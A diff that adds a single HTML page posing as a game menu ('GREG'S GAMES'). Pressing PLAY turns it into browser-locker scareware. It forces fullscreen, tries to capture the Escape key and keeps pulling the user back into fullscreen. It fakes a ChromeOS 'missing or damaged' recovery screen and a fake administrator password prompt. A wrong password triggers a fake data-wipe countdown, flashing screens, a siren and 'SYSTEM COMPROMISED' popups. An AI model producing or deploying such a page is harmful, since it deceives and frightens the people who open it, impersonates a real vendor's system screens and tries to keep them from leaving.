@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>System Recovery - Locked</title>
+    <style>
+        :root { --neon: #00f3ff; --chrome-bg: #202124; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; color: white; cursor: none; }
+        
+        /* --- RE-ENTRY OVERLAY --- */
+        #fs-guard {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999; cursor: pointer;
+            flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        #menu { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; cursor: auto; }
+        .neon-title { font-size: 5rem; color: var(--neon); text-shadow: 0 0 20px var(--neon); font-weight: 900; }
+        .play-btn { padding: 25px 80px; font-size: 1.8rem; background: transparent; color: var(--neon); border: 4px solid var(--neon); border-radius: 12px; cursor: pointer; }
+
+        #recovery { display: none; background: var(--chrome-bg); height: 100vh; flex-direction: column; align-items: center; justify-content: center; }
+        .chrome-logo { width: 80px; margin-bottom: 20px; }
+        
+        #security-modal { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 380px; background: #fff; border-radius: 8px; padding: 24px; z-index: 1000; color: #3c4043; cursor: auto; }
+        .modal-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
+
+        .popup { position: absolute; width: 250px; background: #fff; border: 1px solid #333; z-index: 2000; padding: 10px; color: #000; font-weight: bold; }
+        .flash { animation: siren 0.15s infinite; }
+        @keyframes siren { 0% { background: #f00; } 50% { background: #00f; } 100% { background: #f00; } }
+    </style>
+</head>
+<body onclick="forceFS()">
+
+    <div id="fs-guard">
+        <h1 style="color:red">⚠️ SECURITY ALERT</h1>
+        <p>Click to re-engage System Lock.</p>
+    </div>
+
+    <div id="menu">
+        <h1 class="neon-title">GREG'S GAMES</h1>
+        <button class="play-btn" onclick="init()">PLAY</button>
+    </div>
+
+    <div id="recovery">
+        <img class="chrome-logo" src="https://www.gstatic.com">
+        <h1 style="font-weight:400">ChromeOS is missing or damaged.</h1>
+        <p style="color: #9aa0a6;">Please insert a recovery USB stick or SD card.</p>
+    </div>
+
+    <div id="security-modal">
+        <h2 style="color:#d93025; margin-top:0;">Administrator Required</h2>
+        <p>A system error occurred. Enter password to exit.</p>
+        <input type="password" id="pass" style="width:100%; padding:10px; margin-bottom:10px; box-sizing:border-box;" placeholder="Password">
+        <div id="timer" style="color:red; font-weight:bold; margin-bottom:10px;"></div>
+        <button class="modal-btn" onclick="check()">UNLOCK</button>
+    </div>
+
+    <script>
+        let locked = true;
+        let active = false;
+
+        async function forceFS() {
+            if (!locked) return;
+            try {
+                await document.documentElement.requestFullscreen();
+                // Capture the Escape key so it requires a "Long Press" to exit
+                if (navigator.keyboard && navigator.keyboard.lock) {
+                    await navigator.keyboard.lock(["Escape"]);
+                }
+                document.getElementById('fs-guard').style.display = 'none';
+            } catch (e) { console.log("FS Blocked"); }
+        }
+
+        function init() {
+            active = true;
+            forceFS();
+            document.getElementById('menu').style.display = 'none';
+            document.getElementById('recovery').style.display = 'flex';
+            setTimeout(() => { document.getElementById('security-modal').style.display = 'block'; }, 2000);
+        }
+
+        // Snap back if they manage to exit
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && locked && active) {
+                document.getElementById('fs-guard').style.display = 'flex';
+            }
+        });
+
+        function check() {
+            if (document.getElementById('pass').value === 'greg') {
+                locked = false;
+                if (navigator.keyboard) navigator.keyboard.unlock();
+                document.exitFullscreen();
+                alert("System Restored.");
+                location.reload();
+            } else {
+                startChaos();
+            }
+        }
+
+        function startChaos() {
+            let left = 5;
+            const t = document.getElementById('timer');
+            t.innerText = `Data Wipe in: ${left}s`;
+            const iv = setInterval(() => {
+                left--;
+                t.innerText = `Data Wipe in: ${left}s`;
+                if (left <= 0) {
+                    clearInterval(iv);
+                    document.body.classList.add('flash');
+                    startSiren();
+                    setInterval(spawn, 300);
+                }
+            }, 1000);
+        }
+
+        function startSiren() {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const lfo = ctx.createOscillator();
+            const lfoG = ctx.createGain();
+            osc.type = 'sawtooth';
+            lfo.frequency.value = 2;
+            lfoG.gain.value = 400;
+            lfo.connect(lfoG);
+            lfoG.connect(osc.frequency);
+            osc.connect(ctx.destination);
+            osc.start();
+        }
+
+        function spawn() {
+            const p = document.createElement('div');
+            p.className = 'popup';
+            p.style.top = Math.random()*80 + '%'; p.style.left = Math.random()*80 + '%';
+            p.innerHTML = `CRITICAL ERROR: SYSTEM COMPROMISED`;
+            document.body.appendChild(p);
+        }
+    </script>
+</body>
+</html>
